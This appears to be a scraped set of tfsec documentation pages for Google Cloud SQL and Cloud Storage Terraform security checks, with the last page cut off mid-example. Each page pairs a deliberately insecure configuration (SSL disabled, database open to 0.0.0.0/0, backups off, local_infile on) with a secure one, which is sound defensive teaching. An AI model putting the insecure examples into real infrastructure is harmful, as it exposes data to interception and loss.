{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/sql/enable-backup/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/sql/enable-backup/index.md", "content": "---\ntitle: Enable automated backups to recover from data-loss\n---\n\n# Enable automated backups to recover from data-loss\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nAutomated backups are not enabled by default. Backups are an easy way to restore data in a corruption or data-loss scenario.\n\n### Possible Impact\nNo recovery of lost or corrupted data\n\n### Suggested Resolution\nEnable automated backups\n\n\n### Insecure Example\n\nThe following example will fail the google-sql-enable-backup check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"POSTGRES_12\"\n \tregion           = \"us-central1\"\n \tsettings {\n \t\tbackup_configuration {\n \t\t\tenabled = false\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-sql-enable-backup check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"POSTGRES_12\"\n \tregion           = \"us-central1\"\n \tsettings {\n \t\tbackup_configuration {\n \t\t\tenabled = true\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance#settings.backup_configuration.enabled=true](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance#settings.backup_configuration.enabled=true){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/sql/docs/mysql/backup-recovery/backups](https://cloud.google.com/sql/docs/mysql/backup-recovery/backups){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:19.460519"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/sql/enable-pg-temp-file-logging/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/sql/enable-pg-temp-file-logging/index.md", "content": "---\ntitle: Temporary file logging should be enabled for all temporary files.\n---\n\n# Temporary file logging should be enabled for all temporary files.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nTemporary files are not logged by default. To log all temporary files, a value of `0` should set in the `log_temp_files` flag - as all files greater in size than the number of bytes set in this flag will be logged.\n\n### Possible Impact\nUse of temporary files will not be logged\n\n### Suggested Resolution\nEnable temporary file logging for all files\n\n\n### Insecure Example\n\nThe following example will fail the google-sql-enable-pg-temp-file-logging check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"POSTGRES_12\"\n \tregion           = \"us-central1\"\n }\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-sql-enable-pg-temp-file-logging check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"POSTGRES_12\"\n \tregion           = \"us-central1\"\n \tsettings {\n \t    database_flags {\n \t\t    name  = \"log_temp_files\"\n \t\t    value = \"0\"\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://postgresqlco.nf/doc/en/param/log_temp_files/](https://postgresqlco.nf/doc/en/param/log_temp_files/){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:19.739107"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/sql/encrypt-in-transit-data/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/sql/encrypt-in-transit-data/index.md", "content": "---\ntitle: SSL connections to a SQL database instance should be enforced.\n---\n\n# SSL connections to a SQL database instance should be enforced.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nIn-transit data should be encrypted so that if traffic is intercepted data will not be exposed in plaintext to attackers.\n\n### Possible Impact\nIntercepted data can be read in transit\n\n### Suggested Resolution\nEnforce SSL for all connections\n\n\n### Insecure Example\n\nThe following example will fail the google-sql-encrypt-in-transit-data check.\n```terraform\n\n resource \"google_sql_database_instance\" \"postgres\" {\n \tname             = \"postgres-instance-a\"\n \tdatabase_version = \"POSTGRES_11\"\n \t\n \tsettings {\n \t\ttier = \"db-f1-micro\"\n \t\n \t\tip_configuration {\n \t\t\tipv4_enabled = false\n \t\t\tauthorized_networks {\n \t\t\t\tvalue           = \"108.12.12.0/24\"\n \t\t\t\tname            = \"internal\"\n \t\t\t}\n \t\t\trequire_ssl = false\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-sql-encrypt-in-transit-data check.\n```terraform\n\n resource \"google_sql_database_instance\" \"postgres\" {\n \tname             = \"postgres-instance-a\"\n \tdatabase_version = \"POSTGRES_11\"\n \t\n \tsettings {\n \t\ttier = \"db-f1-micro\"\n \t\n \t\tip_configuration {\n \t\t\tipv4_enabled = false\n \t\t\tauthorized_networks {\n \t\t\t\tvalue           = \"108.12.12.0/24\"\n \t\t\t\tname            = \"internal\"\n \t\t\t}\n \t\t\trequire_ssl = true\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/sql/docs/mysql/configure-ssl-instance](https://cloud.google.com/sql/docs/mysql/configure-ssl-instance){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:19.984455"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/sql/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/sql/index.md", "content": "---\ntitle: sql\n---\n\n# sql\n\n## Checks\n\n\n- [enable-backup](enable-backup) Enable automated backups to recover from data-loss\n\n- [enable-pg-temp-file-logging](enable-pg-temp-file-logging) Temporary file logging should be enabled for all temporary files.\n\n- [encrypt-in-transit-data](encrypt-in-transit-data) SSL connections to a SQL database instance should be enforced.\n\n- [mysql-no-local-infile](mysql-no-local-infile) Disable local_infile setting in MySQL\n\n- [no-contained-db-auth](no-contained-db-auth) Contained database authentication should be disabled\n\n- [no-cross-db-ownership-chaining](no-cross-db-ownership-chaining) Cross-database ownership chaining should be disabled\n\n- [no-public-access](no-public-access) Ensure that Cloud SQL Database Instances are not publicly exposed\n\n- [pg-log-checkpoints](pg-log-checkpoints) Ensure that logging of checkpoints is enabled.\n\n- [pg-log-connections](pg-log-connections) Ensure that logging of connections is enabled.\n\n- [pg-log-disconnections](pg-log-disconnections) Ensure that logging of disconnections is enabled.\n\n- [pg-log-errors](pg-log-errors) Ensure that Postgres errors are logged\n\n- [pg-log-lock-waits](pg-log-lock-waits) Ensure that logging of lock waits is enabled.\n\n- [pg-no-min-statement-logging](pg-no-min-statement-logging) Ensure that logging of long statements is disabled.\n\n\n\n", "timestamp": "2025-10-24T22:25:20.093520"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/sql/mysql-no-local-infile/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/sql/mysql-no-local-infile/index.md", "content": "---\ntitle: Disable local_infile setting in MySQL\n---\n\n# Disable local_infile setting in MySQL\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nArbitrary files can be read from the system using LOAD_DATA unless this setting is disabled.\n\n### Possible Impact\nArbitrary files read by attackers when combined with a SQL injection vulnerability.\n\n### Suggested Resolution\nDisable the local infile setting\n\n\n### Insecure Example\n\nThe following example will fail the google-sql-mysql-no-local-infile check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"MYSQL_5_6\"\n \tregion           = \"us-central1\"\n \tsettings {\n \t\tdatabase_flags {\n \t\t\tname  = \"local_infile\"\n \t\t\tvalue = \"on\"\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-sql-mysql-no-local-infile check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"MYSQL_5_6\"\n \tregion           = \"us-central1\"\n \tsettings {\n \t\tdatabase_flags {\n \t\t\tname  = \"local_infile\"\n \t\t\tvalue = \"off\"\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://dev.mysql.com/doc/refman/8.0/en/load-data-local-security.html](https://dev.mysql.com/doc/refman/8.0/en/load-data-local-security.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://dev.mysql.com/doc/refman/8.0/en/load-data-local-security.html](https://dev.mysql.com/doc/refman/8.0/en/load-data-local-security.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:20.365413"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/sql/no-contained-db-auth/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/sql/no-contained-db-auth/index.md", "content": "---\ntitle: Contained database authentication should be disabled\n---\n\n# Contained database authentication should be disabled\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nUsers with ALTER permissions on users can grant access to a contained database without the knowledge of an administrator\n\n### Possible Impact\nAccess can be granted without knowledge of the database administrator\n\n### Suggested Resolution\nDisable contained database authentication\n\n\n### Insecure Example\n\nThe following example will fail the google-sql-no-contained-db-auth check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"SQLSERVER_2017_STANDARD\"\n \tregion           = \"us-central1\"\n }\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-sql-no-contained-db-auth check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"SQLSERVER_2017_STANDARD\"\n \tregion           = \"us-central1\"\n \tsettings {\n \t    database_flags {\n \t\t    name  = \"contained database authentication\"\n \t\t    value = \"off\"\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/contained-database-authentication-server-configuration-option?view=sql-server-ver15](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/contained-database-authentication-server-configuration-option?view=sql-server-ver15){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:20.640054"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/sql/no-cross-db-ownership-chaining/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/sql/no-cross-db-ownership-chaining/index.md", "content": "---\ntitle: Cross-database ownership chaining should be disabled\n---\n\n# Cross-database ownership chaining should be disabled\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nCross-database ownership chaining, also known as cross-database chaining, is a security feature of SQL Server that allows users of databases access to other databases besides the one they are currently using.\n\n### Possible Impact\nUnintended access to sensitive data\n\n### Suggested Resolution\nDisable cross database ownership chaining\n\n\n### Insecure Example\n\nThe following example will fail the google-sql-no-cross-db-ownership-chaining check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"SQLSERVER_2017_STANDARD\"\n \tregion           = \"us-central1\"\n }\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-sql-no-cross-db-ownership-chaining check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"SQLSERVER_2017_STANDARD\"\n \tregion           = \"us-central1\"\n \tsettings {\n \t    database_flags {\n \t\t    name  = \"cross db ownership chaining\"\n \t\t    value = \"off\"\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/cross-db-ownership-chaining-server-configuration-option?view=sql-server-ver15](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/cross-db-ownership-chaining-server-configuration-option?view=sql-server-ver15){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:20.903877"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/sql/no-public-access/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/sql/no-public-access/index.md", "content": "---\ntitle: Ensure that Cloud SQL Database Instances are not publicly exposed\n---\n\n# Ensure that Cloud SQL Database Instances are not publicly exposed\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nDatabase instances should be configured so that they are not available over the public internet, but to internal compute resources which access them.\n\n### Possible Impact\nPublic exposure of sensitive data\n\n### Suggested Resolution\nRemove public access from database instances\n\n\n### Insecure Example\n\nThe following example will fail the google-sql-no-public-access check.\n```terraform\n\n resource \"google_sql_database_instance\" \"postgres\" {\n \tname             = \"postgres-instance-a\"\n \tdatabase_version = \"POSTGRES_11\"\n \t\n \tsettings {\n \t\ttier = \"db-f1-micro\"\n \t\n \t\tip_configuration {\n \t\t\tipv4_enabled = false\n \t\t\tauthorized_networks {\n \t\t\t\tvalue           = \"108.12.12.0/24\"\n \t\t\t\tname            = \"internal\"\n \t\t\t}\n \t\n \t\t\tauthorized_networks {\n \t\t\t\tvalue           = \"0.0.0.0/0\"\n \t\t\t\tname            = \"internet\"\n \t\t\t}\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-sql-no-public-access check.\n```terraform\n\n resource \"google_sql_database_instance\" \"postgres\" {\n \tname             = \"postgres-instance-a\"\n \tdatabase_version = \"POSTGRES_11\"\n \t\n \tsettings {\n \t\ttier = \"db-f1-micro\"\n \t\n \t\tip_configuration {\n \t\t\tipv4_enabled = false\n \t\t\tauthorized_networks {\n \t\t\t\tvalue           = \"10.0.0.1/24\"\n \t\t\t\tname            = \"internal\"\n \t\t\t}\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://www.cloudconformity.com/knowledge-base/gcp/CloudSQL/publicly-accessible-cloud-sql-instances.html](https://www.cloudconformity.com/knowledge-base/gcp/CloudSQL/publicly-accessible-cloud-sql-instances.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:21.291019"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/sql/pg-log-checkpoints/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/sql/pg-log-checkpoints/index.md", "content": "---\ntitle: Ensure that logging of checkpoints is enabled.\n---\n\n# Ensure that logging of checkpoints is enabled.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nLogging checkpoints provides useful diagnostic data, which can identify performance issues in an application and potential DoS vectors.\n\n### Possible Impact\nInsufficient diagnostic data.\n\n### Suggested Resolution\nEnable checkpoints logging.\n\n\n### Insecure Example\n\nThe following example will fail the google-sql-pg-log-checkpoints check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"POSTGRES_12\"\n \tregion           = \"us-central1\"\n \tsettings {\n \t\tdatabase_flags {\n \t\t\tname  = \"log_checkpoints\"\n \t\t\tvalue = \"off\"\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-sql-pg-log-checkpoints check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"POSTGRES_12\"\n \tregion           = \"us-central1\"\n \tsettings {\n \t\tdatabase_flags {\n \t\t\tname  = \"log_checkpoints\"\n \t\t\tvalue = \"on\"\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://www.postgresql.org/docs/13/runtime-config-logging.html#GUC-LOG-CHECKPOINTS](https://www.postgresql.org/docs/13/runtime-config-logging.html#GUC-LOG-CHECKPOINTS){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:21.572313"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/sql/pg-log-connections/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/sql/pg-log-connections/index.md", "content": "---\ntitle: Ensure that logging of connections is enabled.\n---\n\n# Ensure that logging of connections is enabled.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nLogging connections provides useful diagnostic data such as session length, which can identify performance issues in an application and potential DoS vectors.\n\n### Possible Impact\nInsufficient diagnostic data.\n\n### Suggested Resolution\nEnable connection logging.\n\n\n### Insecure Example\n\nThe following example will fail the google-sql-pg-log-connections check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"POSTGRES_12\"\n \tregion           = \"us-central1\"\n \tsettings {\n \t\tdatabase_flags {\n \t\t\tname  = \"log_connections\"\n \t\t\tvalue = \"off\"\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-sql-pg-log-connections check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"POSTGRES_12\"\n \tregion           = \"us-central1\"\n \tsettings {\n \t\tdatabase_flags {\n \t\t\tname  = \"log_connections\"\n \t\t\tvalue = \"on\"\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://www.postgresql.org/docs/13/runtime-config-logging.html#GUC-LOG-CONNECTIONS](https://www.postgresql.org/docs/13/runtime-config-logging.html#GUC-LOG-CONNECTIONS){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:21.823904"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/sql/pg-log-disconnections/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/sql/pg-log-disconnections/index.md", "content": "---\ntitle: Ensure that logging of disconnections is enabled.\n---\n\n# Ensure that logging of disconnections is enabled.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nLogging disconnections provides useful diagnostic data such as session length, which can identify performance issues in an application and potential DoS vectors.\n\n### Possible Impact\nInsufficient diagnostic data.\n\n### Suggested Resolution\nEnable disconnection logging.\n\n\n### Insecure Example\n\nThe following example will fail the google-sql-pg-log-disconnections check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"POSTGRES_12\"\n \tregion           = \"us-central1\"\n \tsettings {\n \t\tdatabase_flags {\n \t\t\tname  = \"log_disconnections\"\n \t\t\tvalue = \"off\"\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-sql-pg-log-disconnections check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"POSTGRES_12\"\n \tregion           = \"us-central1\"\n \tsettings {\n \t\tdatabase_flags {\n \t\t\tname  = \"log_disconnections\"\n \t\t\tvalue = \"on\"\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://www.postgresql.org/docs/13/runtime-config-logging.html#GUC-LOG-DISCONNECTIONS](https://www.postgresql.org/docs/13/runtime-config-logging.html#GUC-LOG-DISCONNECTIONS){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:22.107851"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/sql/pg-log-errors/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/sql/pg-log-errors/index.md", "content": "---\ntitle: Ensure that Postgres errors are logged\n---\n\n# Ensure that Postgres errors are logged\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nSetting the minimum log severity too high will cause errors not to be logged\n\n### Possible Impact\nLoss of error logging\n\n### Suggested Resolution\nSet the minimum log severity to at least ERROR\n\n\n### Insecure Example\n\nThe following example will fail the google-sql-pg-log-errors check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"POSTGRES_12\"\n \tregion           = \"us-central1\"\n \tsettings {\n \t\tdatabase_flags {\n \t\t\tname  = \"log_min_messages\"\n \t\t\tvalue = \"PANIC\"\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-sql-pg-log-errors check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"POSTGRES_12\"\n \tregion           = \"us-central1\"\n \tsettings {\n \t\tdatabase_flags {\n \t\t\tname  = \"log_min_messages\"\n \t\t\tvalue = \"WARNING\"\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://postgresqlco.nf/doc/en/param/log_min_messages/](https://postgresqlco.nf/doc/en/param/log_min_messages/){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://www.postgresql.org/docs/13/runtime-config-logging.html#GUC-LOG-MIN-MESSAGES](https://www.postgresql.org/docs/13/runtime-config-logging.html#GUC-LOG-MIN-MESSAGES){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:22.389293"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/sql/pg-log-lock-waits/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/sql/pg-log-lock-waits/index.md", "content": "---\ntitle: Ensure that logging of lock waits is enabled.\n---\n\n# Ensure that logging of lock waits is enabled.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nLock waits are often an indication of poor performance and often an indicator of a potential denial of service vulnerability, therefore occurrences should be logged for analysis.\n\n### Possible Impact\nIssues leading to denial of service may not be identified.\n\n### Suggested Resolution\nEnable lock wait logging.\n\n\n### Insecure Example\n\nThe following example will fail the google-sql-pg-log-lock-waits check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"POSTGRES_12\"\n \tregion           = \"us-central1\"\n \tsettings {\n \t\tdatabase_flags {\n \t\t\tname  = \"log_lock_waits\"\n \t\t\tvalue = \"off\"\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-sql-pg-log-lock-waits check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"POSTGRES_12\"\n \tregion           = \"us-central1\"\n \tsettings {\n \t\tdatabase_flags {\n \t\t\tname  = \"log_lock_waits\"\n \t\t\tvalue = \"on\"\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://www.postgresql.org/docs/13/runtime-config-logging.html#GUC-LOG-LOCK-WAITS](https://www.postgresql.org/docs/13/runtime-config-logging.html#GUC-LOG-LOCK-WAITS){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:22.663552"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/sql/pg-no-min-statement-logging/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/sql/pg-no-min-statement-logging/index.md", "content": "---\ntitle: Ensure that logging of long statements is disabled.\n---\n\n# Ensure that logging of long statements is disabled.\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nLogging of statements which could contain sensitive data is not advised, therefore this setting should preclude all statements from being logged.\n\n### Possible Impact\nSensitive data could be exposed in the database logs.\n\n### Suggested Resolution\nDisable minimum duration statement logging completely\n\n\n### Insecure Example\n\nThe following example will fail the google-sql-pg-no-min-statement-logging check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"POSTGRES_12\"\n \tregion           = \"us-central1\"\n \tsettings {\n \t\tdatabase_flags {\n \t\t\tname  = \"log_min_duration_statement\"\n \t\t\tvalue = \"99\"\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-sql-pg-no-min-statement-logging check.\n```terraform\n\n resource \"google_sql_database_instance\" \"db\" {\n \tname             = \"db\"\n \tdatabase_version = \"POSTGRES_12\"\n \tregion           = \"us-central1\"\n \tsettings {\n \t\tdatabase_flags {\n \t\t\tname  = \"log_min_duration_statement\"\n \t\t\tvalue = \"-1\"\n \t\t}\n \t}\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://www.postgresql.org/docs/13/runtime-config-logging.html#GUC-LOG-MIN-DURATION-STATEMENT](https://www.postgresql.org/docs/13/runtime-config-logging.html#GUC-LOG-MIN-DURATION-STATEMENT){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:22.938949"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/storage/enable-ubla/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/storage/enable-ubla/index.md", "content": "---\ntitle: Ensure that Cloud Storage buckets have uniform bucket-level access enabled\n---\n\n# Ensure that Cloud Storage buckets have uniform bucket-level access enabled\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nWhen you enable uniform bucket-level access on a bucket, Access Control Lists (ACLs) are disabled, and only bucket-level Identity and Access Management (IAM) permissions grant access to that bucket and the objects it contains. You revoke all access granted by object ACLs and the ability to administrate permissions using bucket ACLs.\n\n### Possible Impact\nACLs are difficult to manage and often lead to incorrect/unintended configurations.\n\n### Suggested Resolution\nEnable uniform bucket level access to provide a uniform permissioning system.\n\n\n### Insecure Example\n\nThe following example will fail the google-storage-enable-ubla check.\n```terraform\n\n resource \"google_storage_bucket\" \"static-site\" {\n \tname          = \"image-store.com\"\n \tlocation      = \"EU\"\n \tforce_destroy = true\n \t\n \tuniform_bucket_level_access = false\n \t\n \twebsite {\n \t\tmain_page_suffix = \"index.html\"\n \t\tnot_found_page   = \"404.html\"\n \t}\n \tcors {\n \t\torigin          = [\"http://image-store.com\"]\n \t\tmethod          = [\"GET\", \"HEAD\", \"PUT\", \"POST\", \"DELETE\"]\n \t\tresponse_header = [\"*\"]\n \t\tmax_age_seconds = 3600\n \t}\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-storage-enable-ubla check.\n```terraform\n\n resource \"google_storage_bucket\" \"static-site\" {\n \tname          = \"image-store.com\"\n \tlocation      = \"EU\"\n \tforce_destroy = true\n \t\n \tuniform_bucket_level_access = true\n \t\n \twebsite {\n \t\tmain_page_suffix = \"index.html\"\n \t\tnot_found_page   = \"404.html\"\n \t}\n \tcors {\n \t\torigin          = [\"http://image-store.com\"]\n \t\tmethod          = 